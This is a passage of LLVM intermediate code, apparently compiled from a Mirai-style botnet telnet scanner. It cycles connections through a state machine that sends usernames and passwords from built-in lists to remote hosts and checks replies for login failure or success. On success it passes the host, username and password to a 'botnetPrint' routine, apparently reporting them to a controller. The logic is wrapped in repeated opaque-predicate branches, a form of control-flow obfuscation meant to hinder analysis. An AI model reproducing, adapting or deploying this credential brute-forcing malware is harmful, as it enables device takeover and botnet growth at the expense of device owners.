  %474 = load i32, i32* @x.71
  %475 = load i32, i32* @y.72
  %476 = sub i32 %474, 1
  %477 = mul i32 %474, %476
  %478 = urem i32 %477, 2
  %479 = icmp eq i32 %478, 0
  %480 = icmp slt i32 %475, 10
  %481 = or i1 %479, %480
  br i1 %481, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %473
  %482 = load i32, i32* @x.71
  %483 = load i32, i32* @y.72
  %484 = sub i32 %482, 1
  %485 = mul i32 %482, %484
  %486 = urem i32 %485, 2
  %487 = icmp eq i32 %486, 0
  %488 = icmp slt i32 %483, 10
  %489 = or i1 %487, %488
  br i1 %489, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br label %1179

; <label>:490:                                    ; preds = %409
  %491 = load i32, i32* %6, align 4
  %492 = icmp eq i32 %491, -1
  br i1 %492, label %493, label %497

; <label>:493:                                    ; preds = %490
  %494 = load i32, i32* %5, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %495
  call void @reset_telstate(%struct.telstate_t* %496)
  br label %1179

; <label>:497:                                    ; preds = %490
  br label %498

; <label>:498:                                    ; preds = %497
  %499 = load i32, i32* %5, align 4
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %500
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %501, i32 0, i32 7
  %503 = load i32, i32* %502, align 16
  %504 = add i32 %503, 5
  %505 = zext i32 %504 to i64
  %506 = call i64 @time(i64* null) #3
  %507 = icmp slt i64 %505, %506
  br i1 %507, label %508, label %528

; <label>:508:                                    ; preds = %498
  %509 = load i32, i32* @x.71
  %510 = load i32, i32* @y.72
  %511 = sub i32 %509, 1
  %512 = mul i32 %509, %511
  %513 = urem i32 %512, 2
  %514 = icmp eq i32 %513, 0
  %515 = icmp slt i32 %510, 10
  %516 = or i1 %514, %515
  br i1 %516, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %508
  %517 = load i32, i32* %5, align 4
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %518
  call void @reset_telstate(%struct.telstate_t* %519)
  %520 = load i32, i32* @x.71
  %521 = load i32, i32* @y.72
  %522 = sub i32 %520, 1
  %523 = mul i32 %520, %522
  %524 = urem i32 %523, 2
  %525 = icmp eq i32 %524, 0
  %526 = icmp slt i32 %521, 10
  %527 = or i1 %525, %526
  br i1 %527, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br label %528

; <label>:528:                                    ; preds = %originalBBpart277, %498
  br label %1162

; <label>:529:                                    ; preds = %175
  %530 = load i32, i32* %5, align 4
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %531
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %532, i32 0, i32 0
  %534 = load i32, i32* %533, align 16
  %535 = load i32, i32* %3, align 4
  %536 = load i32, i32* %5, align 4
  %537 = sext i32 %536 to i64
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %537
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %538, i32 0, i32 9
  %540 = load i8*, i8** %539, align 8
  %541 = call i32 @read_until_response(i32 %534, i32 %535, i8* %540, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %542 = icmp ne i32 %541, 0
  br i1 %542, label %543, label %608

; <label>:543:                                    ; preds = %529
  %544 = load i32, i32* @x.71
  %545 = load i32, i32* @y.72
  %546 = sub i32 %544, 1
  %547 = mul i32 %544, %546
  %548 = urem i32 %547, 2
  %549 = icmp eq i32 %548, 0
  %550 = icmp slt i32 %545, 10
  %551 = or i1 %549, %550
  br i1 %551, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %543
  %552 = load i32, i32* %5, align 4
  %553 = sext i32 %552 to i64
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %553
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %554, i32 0, i32 9
  %556 = load i8*, i8** %555, align 8
  %557 = call i32 @contains_fail(i8* %556)
  %558 = icmp ne i32 %557, 0
  %559 = load i32, i32* @x.71
  %560 = load i32, i32* @y.72
  %561 = sub i32 %559, 1
  %562 = mul i32 %559, %561
  %563 = urem i32 %562, 2
  %564 = icmp eq i32 %563, 0
  %565 = icmp slt i32 %560, 10
  %566 = or i1 %564, %565
  br i1 %566, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br i1 %558, label %567, label %587

; <label>:567:                                    ; preds = %originalBBpart281
  %568 = load i32, i32* @x.71
  %569 = load i32, i32* @y.72
  %570 = sub i32 %568, 1
  %571 = mul i32 %568, %570
  %572 = urem i32 %571, 2
  %573 = icmp eq i32 %572, 0
  %574 = icmp slt i32 %569, 10
  %575 = or i1 %573, %574
  br i1 %575, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %567
  %576 = load i32, i32* %5, align 4
  %577 = sext i32 %576 to i64
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %577
  call void @advance_state(%struct.telstate_t* %578, i32 0)
  %579 = load i32, i32* @x.71
  %580 = load i32, i32* @y.72
  %581 = sub i32 %579, 1
  %582 = mul i32 %579, %581
  %583 = urem i32 %582, 2
  %584 = icmp eq i32 %583, 0
  %585 = icmp slt i32 %580, 10
  %586 = or i1 %584, %585
  br i1 %586, label %originalBBpart285, label %originalBB83alteredBB

originalBBpart285:                                ; preds = %originalBB83
  br label %607

; <label>:587:                                    ; preds = %originalBBpart281
  %588 = load i32, i32* @x.71
  %589 = load i32, i32* @y.72
  %590 = sub i32 %588, 1
  %591 = mul i32 %588, %590
  %592 = urem i32 %591, 2
  %593 = icmp eq i32 %592, 0
  %594 = icmp slt i32 %589, 10
  %595 = or i1 %593, %594
  br i1 %595, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %587
  %596 = load i32, i32* %5, align 4
  %597 = sext i32 %596 to i64
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %597
  call void @advance_state(%struct.telstate_t* %598, i32 3)
  %599 = load i32, i32* @x.71
  %600 = load i32, i32* @y.72
  %601 = sub i32 %599, 1
  %602 = mul i32 %599, %601
  %603 = urem i32 %602, 2
  %604 = icmp eq i32 %603, 0
  %605 = icmp slt i32 %600, 10
  %606 = or i1 %604, %605
  br i1 %606, label %originalBBpart289, label %originalBB87alteredBB

originalBBpart289:                                ; preds = %originalBB87
  br label %607

; <label>:607:                                    ; preds = %originalBBpart289, %originalBBpart285
  br label %1179

; <label>:608:                                    ; preds = %529
  %609 = load i32, i32* %5, align 4
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %610
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %611, i32 0, i32 7
  %613 = load i32, i32* %612, align 16
  %614 = add i32 %613, 7
  %615 = zext i32 %614 to i64
  %616 = call i64 @time(i64* null) #3
  %617 = icmp slt i64 %615, %616
  br i1 %617, label %618, label %622

; <label>:618:                                    ; preds = %608
  %619 = load i32, i32* %5, align 4
  %620 = sext i32 %619 to i64
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %620
  call void @reset_telstate(%struct.telstate_t* %621)
  br label %622

; <label>:622:                                    ; preds = %618, %608
  %623 = load i32, i32* @x.71
  %624 = load i32, i32* @y.72
  %625 = sub i32 %623, 1
  %626 = mul i32 %623, %625
  %627 = urem i32 %626, 2
  %628 = icmp eq i32 %627, 0
  %629 = icmp slt i32 %624, 10
  %630 = or i1 %628, %629
  br i1 %630, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %622
  %631 = load i32, i32* @x.71
  %632 = load i32, i32* @y.72
  %633 = sub i32 %631, 1
  %634 = mul i32 %631, %633
  %635 = urem i32 %634, 2
  %636 = icmp eq i32 %635, 0
  %637 = icmp slt i32 %632, 10
  %638 = or i1 %636, %637
  br i1 %638, label %originalBBpart293, label %originalBB91alteredBB

originalBBpart293:                                ; preds = %originalBB91
  br label %1162

; <label>:639:                                    ; preds = %175
  %640 = load i32, i32* %5, align 4
  %641 = sext i32 %640 to i64
  %642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %641
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %642, i32 0, i32 0
  %644 = load i32, i32* %643, align 16
  %645 = load i32, i32* %5, align 4
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %646
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %647, i32 0, i32 4
  %649 = load i8, i8* %648, align 2
  %650 = zext i8 %649 to i64
  %651 = getelementptr inbounds [36 x i8*], [36 x i8*]* @usernames, i64 0, i64 %650
  %652 = load i8*, i8** %651, align 8
  %653 = load i32, i32* %5, align 4
  %654 = sext i32 %653 to i64
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %654
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %655, i32 0, i32 4
  %657 = load i8, i8* %656, align 2
  %658 = zext i8 %657 to i64
  %659 = getelementptr inbounds [36 x i8*], [36 x i8*]* @usernames, i64 0, i64 %658
  %660 = load i8*, i8** %659, align 8
  %661 = call i64 @strlen(i8* %660) #9
  %662 = call i64 @send(i32 %644, i8* %652, i64 %661, i32 16384)
  %663 = icmp slt i64 %662, 0
  br i1 %663, label %664, label %668

; <label>:664:                                    ; preds = %639
  %665 = load i32, i32* %5, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %666
  call void @reset_telstate(%struct.telstate_t* %667)
  br label %1179

; <label>:668:                                    ; preds = %639
  %669 = load i32, i32* %5, align 4
  %670 = sext i32 %669 to i64
  %671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %670
  %672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %671, i32 0, i32 0
  %673 = load i32, i32* %672, align 16
  %674 = call i64 @send(i32 %673, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.100, i32 0, i32 0), i64 2, i32 16384)
  %675 = icmp slt i64 %674, 0
  br i1 %675, label %676, label %680

; <label>:676:                                    ; preds = %668
  %677 = load i32, i32* %5, align 4
  %678 = sext i32 %677 to i64
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %678
  call void @reset_telstate(%struct.telstate_t* %679)
  br label %1179

; <label>:680:                                    ; preds = %668
  %681 = load i32, i32* %5, align 4
  %682 = sext i32 %681 to i64
  %683 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %682
  call void @advance_state(%struct.telstate_t* %683, i32 4)
  br label %1162

; <label>:684:                                    ; preds = %175
  %685 = load i32, i32* @x.71
  %686 = load i32, i32* @y.72
  %687 = sub i32 %685, 1
  %688 = mul i32 %685, %687
  %689 = urem i32 %688, 2
  %690 = icmp eq i32 %689, 0
  %691 = icmp slt i32 %686, 10
  %692 = or i1 %690, %691
  br i1 %692, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %684
  %693 = load i32, i32* %5, align 4
  %694 = sext i32 %693 to i64
  %695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %694
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %695, i32 0, i32 0
  %697 = load i32, i32* %696, align 16
  %698 = load i32, i32* %3, align 4
  %699 = load i32, i32* %5, align 4
  %700 = sext i32 %699 to i64
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %700
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %701, i32 0, i32 9
  %703 = load i8*, i8** %702, align 8
  %704 = call i32 @read_until_response(i32 %697, i32 %698, i8* %703, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %705 = icmp ne i32 %704, 0
  %706 = load i32, i32* @x.71
  %707 = load i32, i32* @y.72
  %708 = sub i32 %706, 1
  %709 = mul i32 %706, %708
  %710 = urem i32 %709, 2
  %711 = icmp eq i32 %710, 0
  %712 = icmp slt i32 %707, 10
  %713 = or i1 %711, %712
  br i1 %713, label %originalBBpart297, label %originalBB95alteredBB

originalBBpart297:                                ; preds = %originalBB95
  br i1 %705, label %714, label %747

; <label>:714:                                    ; preds = %originalBBpart297
  %715 = load i32, i32* %5, align 4
  %716 = sext i32 %715 to i64
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %716
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %717, i32 0, i32 9
  %719 = load i8*, i8** %718, align 8
  %720 = call i32 @contains_fail(i8* %719)
  %721 = icmp ne i32 %720, 0
  br i1 %721, label %722, label %742

; <label>:722:                                    ; preds = %714
  %723 = load i32, i32* @x.71
  %724 = load i32, i32* @y.72
  %725 = sub i32 %723, 1
  %726 = mul i32 %723, %725
  %727 = urem i32 %726, 2
  %728 = icmp eq i32 %727, 0
  %729 = icmp slt i32 %724, 10
  %730 = or i1 %728, %729
  br i1 %730, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %722
  %731 = load i32, i32* %5, align 4
  %732 = sext i32 %731 to i64
  %733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %732
  call void @advance_state(%struct.telstate_t* %733, i32 0)
  %734 = load i32, i32* @x.71
  %735 = load i32, i32* @y.72
  %736 = sub i32 %734, 1
  %737 = mul i32 %734, %736
  %738 = urem i32 %737, 2
  %739 = icmp eq i32 %738, 0
  %740 = icmp slt i32 %735, 10
  %741 = or i1 %739, %740
  br i1 %741, label %originalBBpart2101, label %originalBB99alteredBB

originalBBpart2101:                               ; preds = %originalBB99
  br label %746

; <label>:742:                                    ; preds = %714
  %743 = load i32, i32* %5, align 4
  %744 = sext i32 %743 to i64
  %745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %744
  call void @advance_state(%struct.telstate_t* %745, i32 5)
  br label %746

; <label>:746:                                    ; preds = %742, %originalBBpart2101
  br label %1179

; <label>:747:                                    ; preds = %originalBBpart297
  %748 = load i32, i32* %5, align 4
  %749 = sext i32 %748 to i64
  %750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %749
  %751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %750, i32 0, i32 7
  %752 = load i32, i32* %751, align 16
  %753 = add i32 %752, 3
  %754 = zext i32 %753 to i64
  %755 = call i64 @time(i64* null) #3
  %756 = icmp slt i64 %754, %755
  br i1 %756, label %757, label %761

; <label>:757:                                    ; preds = %747
  %758 = load i32, i32* %5, align 4
  %759 = sext i32 %758 to i64
  %760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %759
  call void @reset_telstate(%struct.telstate_t* %760)
  br label %761

; <label>:761:                                    ; preds = %757, %747
  br label %1162

; <label>:762:                                    ; preds = %175
  %763 = load i32, i32* %5, align 4
  %764 = sext i32 %763 to i64
  %765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %764
  %766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %765, i32 0, i32 0
  %767 = load i32, i32* %766, align 16
  %768 = load i32, i32* %5, align 4
  %769 = sext i32 %768 to i64
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %769
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %770, i32 0, i32 5
  %772 = load i8, i8* %771, align 1
  %773 = zext i8 %772 to i64
  %774 = getelementptr inbounds [36 x i8*], [36 x i8*]* @passwords, i64 0, i64 %773
  %775 = load i8*, i8** %774, align 8
  %776 = load i32, i32* %5, align 4
  %777 = sext i32 %776 to i64
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %777
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %778, i32 0, i32 5
  %780 = load i8, i8* %779, align 1
  %781 = zext i8 %780 to i64
  %782 = getelementptr inbounds [36 x i8*], [36 x i8*]* @passwords, i64 0, i64 %781
  %783 = load i8*, i8** %782, align 8
  %784 = call i64 @strlen(i8* %783) #9
  %785 = call i64 @send(i32 %767, i8* %775, i64 %784, i32 16384)
  %786 = icmp slt i64 %785, 0
  br i1 %786, label %787, label %807

; <label>:787:                                    ; preds = %762
  %788 = load i32, i32* @x.71
  %789 = load i32, i32* @y.72
  %790 = sub i32 %788, 1
  %791 = mul i32 %788, %790
  %792 = urem i32 %791, 2
  %793 = icmp eq i32 %792, 0
  %794 = icmp slt i32 %789, 10
  %795 = or i1 %793, %794
  br i1 %795, label %originalBB103, label %originalBB103alteredBB

originalBB103:                                    ; preds = %originalBB103alteredBB, %787
  %796 = load i32, i32* %5, align 4
  %797 = sext i32 %796 to i64
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %797
  call void @reset_telstate(%struct.telstate_t* %798)
  %799 = load i32, i32* @x.71
  %800 = load i32, i32* @y.72
  %801 = sub i32 %799, 1
  %802 = mul i32 %799, %801
  %803 = urem i32 %802, 2
  %804 = icmp eq i32 %803, 0
  %805 = icmp slt i32 %800, 10
  %806 = or i1 %804, %805
  br i1 %806, label %originalBBpart2105, label %originalBB103alteredBB

originalBBpart2105:                               ; preds = %originalBB103
  br label %1179

; <label>:807:                                    ; preds = %762
  %808 = load i32, i32* %5, align 4
  %809 = sext i32 %808 to i64
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %809
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %810, i32 0, i32 0
  %812 = load i32, i32* %811, align 16
  %813 = call i64 @send(i32 %812, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.100, i32 0, i32 0), i64 2, i32 16384)
  %814 = icmp slt i64 %813, 0
  br i1 %814, label %815, label %819

; <label>:815:                                    ; preds = %807
  %816 = load i32, i32* %5, align 4
  %817 = sext i32 %816 to i64
  %818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %817
  call void @reset_telstate(%struct.telstate_t* %818)
  br label %1179

; <label>:819:                                    ; preds = %807
  %820 = load i32, i32* @x.71
  %821 = load i32, i32* @y.72
  %822 = sub i32 %820, 1
  %823 = mul i32 %820, %822
  %824 = urem i32 %823, 2
  %825 = icmp eq i32 %824, 0
  %826 = icmp slt i32 %821, 10
  %827 = or i1 %825, %826
  br i1 %827, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %819
  %828 = load i32, i32* %5, align 4
  %829 = sext i32 %828 to i64
  %830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %829
  call void @advance_state(%struct.telstate_t* %830, i32 6)
  %831 = load i32, i32* @x.71
  %832 = load i32, i32* @y.72
  %833 = sub i32 %831, 1
  %834 = mul i32 %831, %833
  %835 = urem i32 %834, 2
  %836 = icmp eq i32 %835, 0
  %837 = icmp slt i32 %832, 10
  %838 = or i1 %836, %837
  br i1 %838, label %originalBBpart2109, label %originalBB107alteredBB

originalBBpart2109:                               ; preds = %originalBB107
  br label %1162

; <label>:839:                                    ; preds = %175
  %840 = load i32, i32* @x.71
  %841 = load i32, i32* @y.72
  %842 = sub i32 %840, 1
  %843 = mul i32 %840, %842
  %844 = urem i32 %843, 2
  %845 = icmp eq i32 %844, 0
  %846 = icmp slt i32 %841, 10
  %847 = or i1 %845, %846
  br i1 %847, label %originalBB111, label %originalBB111alteredBB

originalBB111:                                    ; preds = %originalBB111alteredBB, %839
  %848 = load i32, i32* %5, align 4
  %849 = sext i32 %848 to i64
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %849
  %851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %850, i32 0, i32 0
  %852 = load i32, i32* %851, align 16
  %853 = load i32, i32* %3, align 4
  %854 = load i32, i32* %5, align 4
  %855 = sext i32 %854 to i64
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %855
  %857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %856, i32 0, i32 9
  %858 = load i8*, i8** %857, align 8
  %859 = call i32 @read_until_response(i32 %852, i32 %853, i8* %858, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %860 = icmp ne i32 %859, 0
  %861 = load i32, i32* @x.71
  %862 = load i32, i32* @y.72
  %863 = sub i32 %861, 1
  %864 = mul i32 %861, %863
  %865 = urem i32 %864, 2
  %866 = icmp eq i32 %865, 0
  %867 = icmp slt i32 %862, 10
  %868 = or i1 %866, %867
  br i1 %868, label %originalBBpart2113, label %originalBB111alteredBB

originalBBpart2113:                               ; preds = %originalBB111
  br i1 %860, label %869, label %1020

; <label>:869:                                    ; preds = %originalBBpart2113
  %870 = load i32, i32* @x.71
  %871 = load i32, i32* @y.72
  %872 = sub i32 %870, 1
  %873 = mul i32 %870, %872
  %874 = urem i32 %873, 2
  %875 = icmp eq i32 %874, 0
  %876 = icmp slt i32 %871, 10
  %877 = or i1 %875, %876
  br i1 %877, label %originalBB115, label %originalBB115alteredBB

originalBB115:                                    ; preds = %originalBB115alteredBB, %869
  %878 = call i64 @time(i64* null) #3
  %879 = trunc i64 %878 to i32
  %880 = load i32, i32* %5, align 4
  %881 = sext i32 %880 to i64
  %882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %881
  %883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %882, i32 0, i32 7
  store i32 %879, i32* %883, align 16
  %884 = load i32, i32* %5, align 4
  %885 = sext i32 %884 to i64
  %886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %885
  %887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %886, i32 0, i32 9
  %888 = load i8*, i8** %887, align 8
  %889 = call i32 @contains_fail(i8* %888)
  %890 = icmp ne i32 %889, 0
  %891 = load i32, i32* @x.71
  %892 = load i32, i32* @y.72
  %893 = sub i32 %891, 1
  %894 = mul i32 %891, %893
  %895 = urem i32 %894, 2
  %896 = icmp eq i32 %895, 0
  %897 = icmp slt i32 %892, 10
  %898 = or i1 %896, %897
  br i1 %898, label %originalBBpart2117, label %originalBB115alteredBB

originalBBpart2117:                               ; preds = %originalBB115
  br i1 %890, label %899, label %919

; <label>:899:                                    ; preds = %originalBBpart2117
  %900 = load i32, i32* @x.71
  %901 = load i32, i32* @y.72
  %902 = sub i32 %900, 1
  %903 = mul i32 %900, %902
  %904 = urem i32 %903, 2
  %905 = icmp eq i32 %904, 0
  %906 = icmp slt i32 %901, 10
  %907 = or i1 %905, %906
  br i1 %907, label %originalBB119, label %originalBB119alteredBB

originalBB119:                                    ; preds = %originalBB119alteredBB, %899
  %908 = load i32, i32* %5, align 4
  %909 = sext i32 %908 to i64
  %910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %909
  call void @advance_state(%struct.telstate_t* %910, i32 0)
  %911 = load i32, i32* @x.71
  %912 = load i32, i32* @y.72
  %913 = sub i32 %911, 1
  %914 = mul i32 %911, %913
  %915 = urem i32 %914, 2
  %916 = icmp eq i32 %915, 0
  %917 = icmp slt i32 %912, 10
  %918 = or i1 %916, %917
  br i1 %918, label %originalBBpart2121, label %originalBB119alteredBB

originalBBpart2121:                               ; preds = %originalBB119
  br label %1019

; <label>:919:                                    ; preds = %originalBBpart2117
  %920 = load i32, i32* %5, align 4
  %921 = sext i32 %920 to i64
  %922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %921
  %923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %922, i32 0, i32 9
  %924 = load i8*, i8** %923, align 8
  %925 = call i32 @contains_success(i8* %924)
  %926 = icmp ne i32 %925, 0
  br i1 %926, label %927, label %998

; <label>:927:                                    ; preds = %919
  %928 = load i32, i32* @x.71
  %929 = load i32, i32* @y.72
  %930 = sub i32 %928, 1
  %931 = mul i32 %928, %930
  %932 = urem i32 %931, 2
  %933 = icmp eq i32 %932, 0
  %934 = icmp slt i32 %929, 10
  %935 = or i1 %933, %934
  br i1 %935, label %originalBB123, label %originalBB123alteredBB

originalBB123:                                    ; preds = %originalBB123alteredBB, %927
  %936 = load i32, i32* %5, align 4
  %937 = sext i32 %936 to i64
  %938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %937
  %939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %938, i32 0, i32 3
  %940 = load i8, i8* %939, align 1
  %941 = zext i8 %940 to i32
  %942 = icmp eq i32 %941, 2
  %943 = load i32, i32* @x.71
  %944 = load i32, i32* @y.72
  %945 = sub i32 %943, 1
  %946 = mul i32 %943, %945
  %947 = urem i32 %946, 2
  %948 = icmp eq i32 %947, 0
  %949 = icmp slt i32 %944, 10
  %950 = or i1 %948, %949
  br i1 %950, label %originalBBpart2125, label %originalBB123alteredBB

originalBBpart2125:                               ; preds = %originalBB123
  br i1 %942, label %951, label %955

; <label>:951:                                    ; preds = %originalBBpart2125
  %952 = load i32, i32* %5, align 4
  %953 = sext i32 %952 to i64
  %954 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %953
  call void @advance_state(%struct.telstate_t* %954, i32 7)
  br label %997

; <label>:955:                                    ; preds = %originalBBpart2125
  %956 = load i32, i32* @x.71
  %957 = load i32, i32* @y.72
  %958 = sub i32 %956, 1
  %959 = mul i32 %956, %958
  %960 = urem i32 %959, 2
  %961 = icmp eq i32 %960, 0
  %962 = icmp slt i32 %957, 10
  %963 = or i1 %961, %962
  br i1 %963, label %originalBB127, label %originalBB127alteredBB

originalBB127:                                    ; preds = %originalBB127alteredBB, %955
  %964 = load i32, i32* @KadenCommStock, align 4
  %965 = load i32, i32* %5, align 4
  %966 = sext i32 %965 to i64
  %967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %966
  %968 = call i8* @get_telstate_host(%struct.telstate_t* %967)
  %969 = load i32, i32* %5, align 4
  %970 = sext i32 %969 to i64
  %971 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %970
  %972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %971, i32 0, i32 4
  %973 = load i8, i8* %972, align 2
  %974 = zext i8 %973 to i64
  %975 = getelementptr inbounds [36 x i8*], [36 x i8*]* @usernames, i64 0, i64 %974
  %976 = load i8*, i8** %975, align 8
  %977 = load i32, i32* %5, align 4
  %978 = sext i32 %977 to i64
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %978
  %980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %979, i32 0, i32 5
  %981 = load i8, i8* %980, align 1
  %982 = zext i8 %981 to i64
  %983 = getelementptr inbounds [36 x i8*], [36 x i8*]* @passwords, i64 0, i64 %982
  %984 = load i8*, i8** %983, align 8
  %985 = call i32 (i32, i8*, ...) @botnetPrint(i32 %964, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.101, i32 0, i32 0), i8* %968, i8* %976, i8* %984)
  %986 = load i32, i32* %5, align 4
  %987 = sext i32 %986 to i64
  %988 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %987
  call void @advance_state(%struct.telstate_t* %988, i32 7)
  %989 = load i32, i32* @x.71
  %990 = load i32, i32* @y.72
  %991 = sub i32 %989, 1
  %992 = mul i32 %989, %991
  %993 = urem i32 %992, 2
  %994 = icmp eq i32 %993, 0
  %995 = icmp slt i32 %990, 10
  %996 = or i1 %994, %995
  br i1 %996, label %originalBBpart2129, label %originalBB127alteredBB

originalBBpart2129:                               ; preds = %originalBB127
  br label %997

; <label>:997:                                    ; preds = %originalBBpart2129, %951
  br label %1002

; <label>:998:                                    ; preds = %919
  %999 = load i32, i32* %5, align 4
  %1000 = sext i32 %999 to i64
  %1001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1000
  call void @reset_telstate(%struct.telstate_t* %1001)
  br label %1002

; <label>:1002:                                   ; preds = %998, %997
  %1003 = load i32, i32* @x.71
  %1004 = load i32, i32* @y.72
  %1005 = sub i32 %1003, 1
  %1006 = mul i32 %1003, %1005
  %1007 = urem i32 %1006, 2
  %1008 = icmp eq i32 %1007, 0
  %1009 = icmp slt i32 %1004, 10
  %1010 = or i1 %1008, %1009
  br i1 %1010, label %originalBB131, label %originalBB131alteredBB

originalBB131:                                    ; preds = %originalBB131alteredBB, %1002
  %1011 = load i32, i32* @x.71
  %1012 = load i32, i32* @y.72
  %1013 = sub i32 %1011, 1
  %1014 = mul i32 %1011, %1013
  %1015 = urem i32 %1014, 2
  %1016 = icmp eq i32 %1015, 0
  %1017 = icmp slt i32 %1012, 10
  %1018 = or i1 %1016, %1017
  br i1 %1018, label %originalBBpart2133, label %originalBB131alteredBB

originalBBpart2133:                               ; preds = %originalBB131
  br label %1019

; <label>:1019:                                   ; preds = %originalBBpart2133, %originalBBpart2121
  br label %1179

; <label>:1020:                                   ; preds = %originalBBpart2113
